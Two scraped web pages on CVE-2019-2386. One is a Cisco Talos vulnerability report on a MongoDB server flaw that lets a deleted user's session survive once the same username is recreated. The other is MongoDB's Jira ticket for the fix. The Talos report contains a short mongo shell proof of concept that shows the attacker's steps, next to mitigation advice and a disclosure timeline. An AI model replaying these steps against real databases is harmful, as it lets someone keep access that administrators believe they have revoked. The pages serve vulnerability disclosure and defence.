=== Content from www.talosintelligence.com_ae4dc614_20250121_000520.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2019-0829

## MongoDB Server session reuse vulnerability

##### August 6, 2019

##### CVE Number

CVE-2019-2386

### Summary

An exploitable authentication vulnerability exists in MongoDB Server prior to version 4.0.9. Access to a MongoDB database server can be persisted after user deletion by reusing an established session of said user.

### Tested Versions

MongoDB Server 4.0.5
MongoDB Server 3.4.18

### Product URLs

<https://www.mongodb.com/>

### CVSSv3 Score

7.1 - CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H

### CWE

CWE-287 - Improper Authentication

### Details

Generally, a MongoDB server’s session can not be used anymore after the associated user is deleted.

The following behavior is present in MongoDB:

```
1. A session is established with a user.
2. Said user is deleted by an administrator.
3. Actions are attempted on the previously established session and fail.
4. The session is revoked, and is not reusable even if the user is recreated.

```

However, if there is no activity attempted on the session in step 3 above, and the user is recreated, the session can be reused.

This provides a possible mechanism for persisting access to a MongoDB server when administrators believe revocation has occurred.

There are two major requirements for exploitation of this bug:

```
1. Previous access to a user session.
2. An administrator recreating a the user corresponding to this session.

```
### Exploit Proof of Concept

Simple and reliable exploitation is possible with any MongoDB client.

Here is an exploitation example using the `mongo` shell utility.

The example contains two shells: an admin and an attacker shell.

The commands are labelled with their shell and are given in chronological order.

```
[attacker connects with "admin" user]
AdminShell$ mongo mongodb://admin:admin@localhost:27017/test

[admin creates "abc" user]
AdminShell> db.createUser({user: "abc", pwd: "abc", roles: [{role: "readWrite", db: "test"}]})

[attacker connects with "abc" user]
AttackerShell$ mongo mongodb://abc:abc@localhost:27017/test

[admin revokes access for "abc" user]
AdminShell> db.dropUser("abc")

[some amount of time passes without activity on the attacker shell]

[admin re-creates "abc" user, possibly with different password]
AdminShell> db.createUser({user: "abc", pwd: "def", roles: [{role: "readWrite", db: "test"}]})

[attacker successfully accesses database contents with previously established session]
AttackerShell> db.test.findOne()

```
### Mitigation

After user deletion, never create a user with the same username again.

This will ensure that database access is revoked from anyone using a previously deleted user.

### Timeline

2019-01-08 - Initial disclosure

2019-01-30 - Vendor acknowledged

2019-04-04 - Vendor assigned CVE

2019-04-16 - Fix released without vulnerability disclosure

2019-08-06 - Public disclosure

##### Credit

Discovered by Mitch Wasson of Cisco's Advanced Malware Protection Group.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2018-0736](/vulnerability_reports/TALOS-2018-0736) [Previous Report

TALOS-2019-0813](/vulnerability_reports/TALOS-2019-0813)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from jira.mongodb.org_0b79b5f8_20250121_000519.html ===


[Log in](/login.jsp?os_destination=%2Fbrowse%2FSERVER-38984)[Skip to main content](#main)[Skip to sidebar](#sidebar)[![MongoDB Jira](/s/-1w64q3/9160001/fy41z4/_/jira-logo-scaled.png)](https://jira.mongodb.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")
* [eazyBI](/plugins/servlet/eazybi)

* Give feedback to Atlassian
* [Help](/secure/ViewKeyboardShortcuts%21default.jspa "Help")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FSERVER-38984)
  + [Acknowledged notifications](/plugins/servlet/wittified/profile/notifications)

![Uploaded image for project: 'Core Server'](https://jira.mongodb.org/secure/projectavatar?pid=10000&avatarId=13900)

1. [Core Server](/browse/SERVER)
2. [SERVER-38984](/browse/SERVER-38984)

## Attach IDs to users

Schedule Issue[Undo Transition](/secure/UndoTransition%21default.jspa?id=671997)ClosedExportnullXMLWordPrintableJSON
### Details

* **Type:**
  ![Icon: Task](/secure/viewavatar?size=xsmall&avatarId=14718&avatarType=issuetype "Task - A task that needs to be done.") Task
* **Resolution:**
  Fixed
* **Priority:**
  ![Icon: Major - P3](/images/icons/priorities/major.svg "Major - P3 - Major loss of function.") Major - P3
* **Fix Version/s:**
  [3.4.22](/issues/?jql=project+%3D+SERVER+AND+fixVersion+%3D+3.4.22 "3.4.22 "), [3.6.13](/issues/?jql=project+%3D+SERVER+AND+fixVersion+%3D+3.6.13 "3.6.13 "), [4.0.9](/issues/?jql=project+%3D+SERVER+AND+fixVersion+%3D+4.0.9 "4.0.9 "), [4.1.9](/issues/?jql=project+%3D+SERVER+AND+fixVersion+%3D+4.1.9 "4.1.9 ")
* **Affects Version/s:**
  None
* **Component/s:**
  [Internal Code](/issues/?jql=project+%3D+SERVER+AND+component+%3D+%22Internal+Code%22 "Internal Code "), [Security](/issues/?jql=project+%3D+SERVER+AND+component+%3D+Security "Security ")
* **Labels:**
  None

* **Backwards Compatibility:**
  Major Change
* **Backport Requested:**
  v4.0, v3.6, v3.4
* **Sprint:**
  Security 2019-01-28, Security 2019-02-11, Security 2019-02-25
* **Case:**

  (copied to CRM)

### Description

**CVE-2019-2386**

**Description**

After user deletion in MongoDB Server the improper invalidation of authorization sessions allows an authenticated user's session to persist and become conflated with new accounts, if those accounts reuse the names of deleted ones. This issue affects: MongoDB Inc. MongoDB Server v4.0 versions prior to 4.0.9; v3.6 versions prior to 3.6.13; v3.4 versions prior to 3.4.22.

**Workarounds**

After deleting one or more users, restart any nodes which may have had active user authorization sessions.

Refrain from creating user accounts with the same name as previously deleted accounts.

**Credit**

Discovered by Mitch Wasson of Cisco's Advanced Malware Protection Group.

### Attachments

### Activity

### People

Assignee:
![sara.golemon@mongodb.com](https://jira.mongodb.org/secure/useravatar?size=small&avatarId=10122)
Sara Golemon

Reporter:
![spencer.jackson@mongodb.com](https://jira.mongodb.org/secure/useravatar?size=small&avatarId=10122)
Spencer Jackson

Participants:

[Githook User](/secure/IssueNavigator.jspa?reset=true&customfield_10051=xgen-internal-githook "Find all issues Githook User participated in"), [Sara Golemon](/secure/IssueNavigator.jspa?reset=true&customfield_10051=sara.golemon%40mongodb.com "Find all issues Sara Golemon participated in"), [Spencer Jackson](/secure/IssueNavigator.jspa?reset=true&customfield_10051=spencer.jackson%40mongodb.com "Find all issues Spencer Jackson participated in")

Votes:
0
Vote for this issue

Watchers:
9
Start watching this issue

### Dates

Created:

Jan 14 2019 04:06:06 PM UTC

Updated:

Oct 29 2023 10:25:09 PM UTC

Resolved:

Feb 14 2019 04:47:22 PM UTC

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for MongoDB. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)


